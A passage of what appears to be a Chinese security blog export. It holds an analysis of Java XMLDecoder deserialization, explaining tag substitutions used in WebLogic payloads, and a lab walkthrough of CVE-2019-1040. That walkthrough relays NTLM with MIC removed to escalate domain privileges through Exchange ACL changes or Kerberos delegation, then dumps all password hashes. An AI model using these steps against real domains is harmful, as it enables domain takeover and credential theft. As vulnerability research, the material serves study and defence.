alt=\"laaF41.png\"></p>\n<p>首先看下XML编码以及写入文件过程，见下图红框处</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laanDe.png\" alt=\"laanDe.png\"></p>\n<p>在程序将Student类的实例在XML编码后写入student.xml，student.xml文件如下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laal4I.png\" alt=\"laal4I.png\"></p>\n<p>接下来，程序将读取student.xml文件内容，并进行xml反序列化</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laU5jS.png\" alt=\"laU5jS.png\"></p>\n<h2 id=\"XMLDecoder反序列化\"><a href=\"#XMLDecoder反序列化\" class=\"headerlink\" title=\"XMLDecoder反序列化\"></a>XMLDecoder反序列化</h2><p>为了研究xmldecoder是如何进行反序列化，以及文章开头我们提出的问题，我们跟一下代码</p>\n<p>在readObject方法上下断，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laagrF.png\" alt=\"laagrF.png\"></p>\n<p>之后的调用栈特别的深，从我们TestStudent中的readObject到DocumentHandler类中的startElement方法。具体可以见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUDXD.png\" alt=\"laUDXD.png\"></p>\n<p>之所以我们要在DocumentHandler中的startElement下断点，是因为DocumentHandler继承自DefaultHandler。DefaultHandler是使用SAX进行XML解析的默认Handler。因此DocumentHandler相当于xml解析的开始，而startElement是开始标签处理函数，包括属性的添加，因此我们从开始标签处理处着手跟入。</p>\n<p>但是在正式跟入前，我们首先看下DocumentHandler的构造方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laatKS.png\" alt=\"laatKS.png\"></p>\n<p>上图构造方法中，定义了可以解析的xml元素以及它们对应的使用的解析器</p>\n<p>关于这点，我们正式跟入startElement中的断点，从下图startElement中看到</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laURht.png\" alt=\"laURht.png\"></p>\n<p>在this.handlers列表中，这里包含了各个xml元素对应使用的解析器</p>\n<p>对照我们的xml文件</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/06/lryAAI.png\" alt=\"lryAAI.png\"></p>\n<p>第一个标签是java</p>\n<p>Java对应的解析器是JavaElementHandler</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUwp6.png\" alt=\"laUwp6.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laa9HJ.png\" alt=\"laa9HJ.png\"></p>\n<p>我们先跳过java标签不看，直接看下一个解析的标签</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaMEd.png\" alt=\"laaMEd.png\"></p>\n<p>下一个标签就是重要的object标签</p>\n<p>根据对应关系，进入ObjectElementHandler解析器，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laamuD.png\" alt=\"laamuD.png\"></p>\n<p>从上图可见ObjectElementHandler 继承了 NewElementHandler类</p>\n<p>而NewElementHandler类，正是new标签对应的解析类，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laa3Ct.png\" alt=\"laa3Ct.png\"></p>\n<p>这里已经涉及到为什么可以用new代替object的部分原因了，但是不是确凿证据。记住这里的继承关系，我们接着看ObjectElementHandler类</p>\n<p>在ObjectElementHandler类中，存在一个addAttribute方法，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUh1f.png\" alt=\"laUh1f.png\"></p>\n<p>addAttribute的作用是在解析对应标签时，为标签对象添加相应的属性</p>\n<p>这里我们解析的时object标签，而我们的object标签中只有class属性，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laa88P.png\" alt=\"laa88P.png\"></p>\n<p>当然，如果有idref、field、index、method等等，程序会将其值赋值给对应的属性</p>\n<p>例如下图，object有index属性</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUj3V.png\" alt=\"laUj3V.png\"></p>\n<p>那么这里的this.index就为”xxx”</p>\n<p>回到正文，由于上述属性我们的xml object里都没有，直接进入下图断点</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaA9x.png\" alt=\"laaA9x.png\"></p>\n<p>调用父类NewElementHandler的addAttribute方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaQUA.png\" alt=\"laaQUA.png\"></p>\n<p>NewElementHandler中addAttribute方法为对象添加class属性</p>\n<p>这样看来，需要继承NewElementHandler类的标签解析器，对应的标签默认都有class属性。因为这些标签默认都有class属性，因此直接继承NewElementHandler类中addAttribute方法对class属性进行赋值，这样就不用一一重写了。</p>\n<p>为了证明一下我的观点，我们跳出测试xml文件，直接看一下weblogic的漏洞利用的poc</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/06/lryENt.png\" alt=\"lryENt.png\"></p>\n<p>可见java标签、object标签、array标签，都有class属性</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaZjO.png\" alt=\"laaZjO.png\"></p>\n<p>array标签的解析器也继承了NewElementHandler</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUTBQ.png\" alt=\"laUTBQ.png\"></p>\n<p>由于java标签要处理version，于是自己实现了class标签处理而非继承NewElementHandler</p>\n<p>回到调试流程中，在NewElementHandler的addAttribute方法中进行class属性赋值</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUUt1.png\" alt=\"laUUt1.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laU01K.png\" alt=\"laU01K.png\"></p>\n<p>经过class赋值后，object标签的tpye属性已经为我们的Student类对象</p>\n<p>接下来，程序将逐一为我们的xml里的标签进行addAttribute属性赋值操作，从java标签到object标签到void等等</p>\n<p>当DocumentHandler中的startElement这个过程结束后，程序将调用endElement方法，endElement方法为结束标签处理函数，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUxjU.png\" alt=\"laUxjU.png\"></p>\n<p>endElement方法中将调用getValueObject方法获取每一个标签所产生的对象对应的ValueObject实例</p>\n<p>我们直接跳转到对object标签的处理</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laadEj.png\" alt=\"laadEj.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaVgK.png\" alt=\"laaVgK.png\"></p>\n<p>从上图可见，程序直接通过Expression生成实例。这里对应生成了我们的Student类的实例</p>\n<p>XMLDecoder反序列化的流程就是上文分析的这样，那为什么可以用new、代替object呢？</p>\n<h3 id=\"为什么可以用new替换object\"><a href=\"#为什么可以用new替换object\" class=\"headerlink\" title=\"为什么可以用new替换object\"></a>为什么可以用new替换object</h3><p>还记不记得上文这里</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaUbQ.png\" alt=\"laaUbQ.png\"></p>\n<p>当解析object标签，用的是ObjectElementHandler解析器，而ObjectElementHandler继承了NewElementHandler。更重要的是，在将object中class属性进行赋值时，用的仍然是NewElementHandler中的addAttribute方法。New标签直接使用NewElementHandler进行解析。因此二者最终进行我们Student类实例的赋值操作是完全一样的</p>\n<h3 id=\"为什么可以用void替换object\"><a href=\"#为什么可以用void替换object\" class=\"headerlink\" title=\"为什么可以用void替换object\"></a>为什么可以用void替换object</h3><p>经过上文的分析，这个问题更简单了，我们看下void标签的解析器</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laUbAs.png\" alt=\"laUbAs.png\"></p>\n<p>void标签的解析器是VoidElementHandler，这个解析器直接继承了ObjectElementHandler，并且仅仅重写了isArgument方法,而这个方法在我们反序列化利用的过程中并无影响</p>\n<h3 id=\"为什么可以用method替换object\"><a href=\"#为什么可以用method替换object\" class=\"headerlink\" title=\"为什么可以用method替换object\"></a>为什么可以用method替换object</h3><p>这个问题也比较简单，我们看下method标签的解析器</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaiNR.png\" alt=\"laaiNR.png\"></p>\n<p>可见与object一样，也是继承了NewElementHandler类。与此同时，于object类中的addAttribute方法中类似，也是使用NewElementHandler类中的addAttribute方法处理class属性。Method与Object标签解析器实现的方式几乎一摸一样，因此可以用method代替object</p>"},{"title":"结合CVE-2019-1040漏洞的两种域提权利用深度分析","date":"2019-06-26T06:46:10.000Z","cover":"https://s2.ax1x.com/2019/09/26/um6txJ.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。\n\n通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。\n\n<!--more-->\n\n## **0x01 漏洞利用**\n\n------\n\n\n\n### **攻击方式一：Exchange**\n\n**验证环境：**\n\n| **角色** | **系统版本**           | **计算机名** | **IP****地址**  | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.150 | test.local |\n| Exchange | Windows Server 2012 R2 | topsec       | 192.168.123.143 | test.local |\n\n\n\n**验证过程：**\n\n① 环境搭建\n\n- 安装配置域控制器\n- 安装配置Exchange Server，参考[1]\n- 在域中新建一个用于测试的账户test\n\n②执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中--remove-mic选项用于清除MIC标志，--escalate-user用于提升指定用户权限。\n\n![umDaAU.png](https://s2.ax1x.com/2019/09/26/umDaAU.png)\n\n③ 执行printerbug.py脚本，触发SpoolService的bug。\n\n[![umDdNF.png](https://s2.ax1x.com/2019/09/26/umDdNF.png)](https://imgchr.com/i/umDdNF)\n\n④ SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。\n\n![umDwh4.png](https://s2.ax1x.com/2019/09/26/umDwh4.png)\n\n接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。\n\n首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示：\n\n![umDB9J.png](https://s2.ax1x.com/2019/09/26/umDB9J.png)\n\n该用户组下的成员正是中继的计算机账户TOPSEC\n\n![umDD39.png](https://s2.ax1x.com/2019/09/26/umDD39.png)\n\n因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）：\n\n![umDrcR.png](https://s2.ax1x.com/2019/09/26/umDrcR.png)\n\n\n\n⑤ 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：\n\n[![umDsj1.png](https://s2.ax1x.com/2019/09/26/umDsj1.png)](https://imgchr.com/i/umDsj1)\n\n\n\n### 攻击方式二：Kerberos委派\n\n**验证环境：**\n\n| **角色** | **系统版本**           | **计算机名** | **IP****地址**  | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.212 | test.local |\n| SDC      | Windows Server 2012 R2 | topsec       | 192.168.123.62  | test.local |\n\n\n\n**验证过程：**\n\n① 环境搭建\n\n- 安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考[2]\n- 安装配置辅助域控制器，参考[3]\n- 在域中新建一个用于测试的账户topsec，一个域管理员admin\n\n② 和攻击方式一相同，执行ntlmrelayx.py本，使用--delegate-access选项，delegate-access选项将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。\n\n![umD6nx.png](https://s2.ax1x.com/2019/09/26/umD6nx.png)\n\n③ attacker对辅助域控制器(SDC)执行printerbug.py脚本\n\n![umDcB6.png](https://s2.ax1x.com/2019/09/26/umDcB6.png)\n\nprinterbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。\n\nntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange  Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）,  并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。\n\n![umDgHK.png](https://s2.ax1x.com/2019/09/26/umDgHK.png)\n\n![umDWND.png](https://s2.ax1x.com/2019/09/26/umDWND.png)\n\n④使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。\n\n![umDf4e.png](https://s2.ax1x.com/2019/09/26/umDf4e.png)\n\n⑤ 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值：\n\n![umD49H.png](https://s2.ax1x.com/2019/09/26/umD49H.png)\n\n## **0x02 漏洞细节**\n\n------\n\n\n此次的攻击流程有如下两个方式：\n\n1、Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。\n\n\n\n2、Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。\n\n\n\n### Exchange攻击流程\n\n下文出现的攻击流量图中,个角色与ip对应关系同上文**验证环境**搭建：\n\n\n\n| **角色** | **系统版本**           | **计算机名** | **IP地址**      | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.150 | test.local |\n| Exchange | Windows Server 2012 R2 | topsec       | 192.168.123.143 | test.local |\n\n\n\n下文标题内容，即为攻击流程，对应流程图中红框所示的流程\n\n如果对SMB协议不是很清楚的读者，可以先参考**技术点分析-客户端与服务器端的SMB通信**一节内容\n\n\n\n#### attacker使用普通AD账户登陆Exchange\n\n在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。\n\n首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。\n\n![umDIgA.png](https://s2.ax1x.com/2019/09/26/umDIgA.png)\n\nAttacker通过SMB2协议登陆Exchange流程\n\n\n\n\n\n![umDojI.png](https://s2.ax1x.com/2019/09/26/umDojI.png)\n\nAttacker通过SMB2协议登陆Exchange流量\n\n\n\n成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。\n\n\n#### 触发SpoolService错误\n\nattacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printerbug\n\n![umD7ut.png](https://s2.ax1x.com/2019/09/26/umD7ut.png)\n\nAttacker发送SpoolService错误payload流程\n\n\n\n![umDHDP.png](https://s2.ax1x.com/2019/09/26/umDHDP.png)\n\nAttacker通过printerbug向Exchange发送带有payload的流量\n\n\n\n#### Exchange主机向Attacker发送Negotiate Protocol Request\n\n在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证\n\nExchange服务器向Attacker发送NegotiateProtocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信\n\n![umDbHf.png](https://s2.ax1x.com/2019/09/26/umDbHf.png)\n\nExchange向Attacker发送SMB协商请求流程\n\n\n\n![umDLE8.png](https://s2.ax1x.com/2019/09/26/umDLE8.png)\n\nExchange向Attacker发送SMB协商请求流量\n\n在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。\n\n\n\n#### Attacker将协商请求通过ldap中继到DC服务器\n\n![umDOUS.png](https://s2.ax1x.com/2019/09/26/umDOUS.png)\n\nAttacker向DC中继Exchange的协商请求流程\n\n\n\n![umDX4g.png](https://s2.ax1x.com/2019/09/26/umDX4g.png)\n\nAttacker向DC中继Exchange的协商请求流量\n\n\n\nAttacker作为中间人，将Negotiate ProtocolRequest通过ldap请求中继到ad服务器\n\n在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分\n\n\n\n#### attacker向Exchange发送Negotiate Protocol Response\n\n![umDvCQ.png](https://s2.ax1x.com/2019/09/26/umDvCQ.png)\n\nAttacker向Exchange发送Negotiate Protocol Response流程\n\n\n\n![umDx3j.png](https://s2.ax1x.com/2019/09/26/umDx3j.png)\n\nAttacker向Exchange发送Negotiate Protocol Response流量\n\n\n\n#### Exchange向attacker发送Session Setup Request\n\n![umDzgs.png](https://s2.ax1x.com/2019/09/26/umDzgs.png)\n\nExchange向attacker发送Session Setup Request流程\n\n\n\n![umDx3j.png](https://s2.ax1x.com/2019/09/26/umDx3j.png)\n\nExchange向attacker发送Session Setup Request流量\n\n\n\n#### Attacker向DC中继Session Setup Request\n\n![umrSvn.png](https://s2.ax1x.com/2019/09/26/umrSvn.png)\n\nAttacker向DC中继Session Setup Request流程\n\n\n\n![umr9uq.png](https://s2.ax1x.com/2019/09/26/umr9uq.png)\n\nAttacker向DC中继Session Setup Request流量\n\n\n\nAttacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker\n\n\n\n#### Attacker 向exchange发送Session Setup Response（CHALLENGE）\n\n![umrCD0.png](https://s2.ax1x.com/2019/09/26/umrCD0.png)\n\nAttacker 向exchange发送Session Setup Response流程\n\n\n\n![umrPbV.png](https://s2.ax1x.com/2019/09/26/umrPbV.png)\n\nAttacker 向exchange发送Session Setup Response流量\n\n\n\nAttacker 将DC发出的包含challenge的Session Setup Response发送给exchange\n\n\n\n#### exchange向Attacker发送包含了身份验证请求的Session Setup\n\n![umrFET.png](https://s2.ax1x.com/2019/09/26/umrFET.png)\n\nexchange向Attacker发送包含了身份验证请求的Session Setup Request流程\n\n\n\n![umrPbV.png](https://s2.ax1x.com/2019/09/26/umrPbV.png)\n\nexchange向Attacker发送包含了身份验证请求的Session Setup流量\n\n\n\n我们可以看到上图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$）\n\nExchange收到challenge后，向attacker发送包含了身份验证请求的Session Setup流量\n\n\n\n#### Attacker向 DC中继含有Exchange的身份认证的Session Setup Request\n\n\n\n![umyB9g.png](https://s2.ax1x.com/2019/09/26/umyB9g.png)\n\nAttacker向 DC中继Session Setup Request流程\n\n\n\n![umrkUU.png](https://s2.ax1x.com/2019/09/26/umrkUU.png)\n\nAttacker向 DC中继Session Setup Request流量\n\n\n\nDC认证通过Exchange身份，并向Attcker发送认证通过的Response。\n\n此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份。由于安装Exchange后，Exchange在Active  Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted  Subsystem，该用户组又隶属于Exchange Windows Permissions。ExchangeWindows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。\n\n使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步ActiveDirectory中用户的所有哈希密码。\n\n![umre29.png](https://s2.ax1x.com/2019/09/26/umre29.png)\n\n同步Active Directory中用户的所有哈希密码\n\n\n\n\n\n### Kerberos委派攻击流程\n\n下文出现的攻击流量图中,个角色与ip对应关系同上文**验证环境**搭建：\n\n\n\n| 角色     | 系统版本               | 计算机名  | IP地址          | 域         |\n| -------- | ---------------------- | --------- | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu    | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc | 192.168.123.212 | test.local |\n| SDC      | Windows Server 2012 R2 | topsec    | 192.168.123.62  | test.local |\n\n\n\n\n\nKerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。\n\n\n\n在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码，如下图\n\n![um5ZGt.png](https://s2.ax1x.com/2019/09/26/um5ZGt.png)\n\nNtlmrelayx工具成功创建计算机账户\n\n\n\n![um46KS.png](https://s2.ax1x.com/2019/09/26/um46KS.png)\n\nDC上可见computers列表中新创建的名为EJETBTTB的计算机\n\n\n\n在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤\n\n![umrmvR.png](https://s2.ax1x.com/2019/09/26/umrmvR.png)\n\n攻击步骤\n\n\n\n#### 攻击者为Service A配置了基于资源的约束委派\n\n由于通过S4U2Self请求到的TGSforwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。\n\n\n\n#### Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.\n\n\n\n![umIVw4.png](https://s2.ax1x.com/2019/09/26/umIVw4.png)\n\n\n\n\n\n通过国外安全研究员Elad  Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation，  服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A  可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据.\n\n\n\n#### SDC将为admin用户申请的访问ServiceA的TGS发送给Service A\n\n![umsnJg.png](https://s2.ax1x.com/2019/09/26/umsnJg.png)\n\n\n\n#### Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据\n\n![umsuWQ.png](https://s2.ax1x.com/2019/09/26/umsuWQ.png)\n\n####  \n\n#### SDC将为admin用户申请的访问SDC的TGS发送给Service A\n\n在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权\n\n![umslyn.png](https://s2.ax1x.com/2019/09/26/umslyn.png)\n\n\n\n## **0x03技术点分析**\n\n------\n\n\n\n在理清利用流程后，接下来详解利用流程中的技术点\n\n### 客户端与服务器端的SMB通信\n\n补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分\n\n\n\n![umD53d.png](https://s2.ax1x.com/2019/09/26/umD53d.png)\n\n客户端与服务器端的SMB通信流程\n\n\n\n### **SMB2 / Negotiate Protocol**\n\nNegotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。\n\n\n\nNegotiate Protocol命令分为如下两部分：\n\n1. Negotiate Protocol Request：客户端向服务器发送第一个SMB请求：“Negotiate ProtocolRequest”。这个请求包含了客户端所支持的各种 SMB Dialect。\n2. Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。\n\n\n\n**SMB2 / Session Setup**\n\nSMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。\n\nSession Setup分为如下两部分：\n\n1.Session SetupRequest: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。\n\n\\2. Session SetupResponse: 服务器回复是否通过验证。\n\n### SpoolService/printer bug\n\n在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。\n\nWindows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。\n\n\n\n任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。\n\n![umsKzj.png](https://s2.ax1x.com/2019/09/26/umsKzj.png)\n\n\n\n在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。\n\n![umDifH.png](https://s2.ax1x.com/2019/09/26/umDifH.png)\n\n下图是printerbug.py执行后的数据包：\n\n![umDkpd.png](https://s2.ax1x.com/2019/09/26/umDkpd.png)\n\n1、第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test；\n\n2、接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。\n\n![umsbtS.png](https://s2.ax1x.com/2019/09/26/umsbtS.png)\n\n3、第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证）\n\n\n\n### SMB中继LDAP思路以及难点\n\n在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下：\n\n1、默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态\n\n![umDE6I.png](https://s2.ax1x.com/2019/09/26/umDE6I.png)\n\n2、将此SMB流量中继到LDAP时，由于此时的NegotiateSign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败\n\n3、为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set\n\n4、MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过\n\n5、需要寻找一种可以绕过MIC校验的方式，以便更改包中的值\n\n6、在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP\n\n\n\n### MIC校验\n\nNTLM身份验证由3种消息类型组成：\n\nNTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。\n\nNTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段\n\n![umDVXt.png](https://s2.ax1x.com/2019/09/26/umDVXt.png)\n\nClinet与Server交互流程图\n\n\n\n![umDenP.png](https://s2.ax1x.com/2019/09/26/umDenP.png)\n\nClinet与Server交互流量\n\n\n\n![umDm0f.png](https://s2.ax1x.com/2019/09/26/umDm0f.png)\n\nSMB认证协议流程\n\n\n\n为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。\n\n![umDn78.png](https://s2.ax1x.com/2019/09/26/umDn78.png)\n\n存放于NTLM_AUTH中的MIC\n\n\n\nMIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。\n\n因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。\n\n\n\n### MIC校验绕过\n\nMicrosoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。\n\n如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤：\n\n取消MIC校验以确保可以修改数据包中的内容：\n\n（1）从NTLM_AUTHENTICATE消息中删除MIC\n\n（2）从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。\n\n\n\n### LDAP签名绕过\n\n在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验\n\n将NEGOTIATE_SIGN设置为notset以绕过LDAP验证\n\n（1）    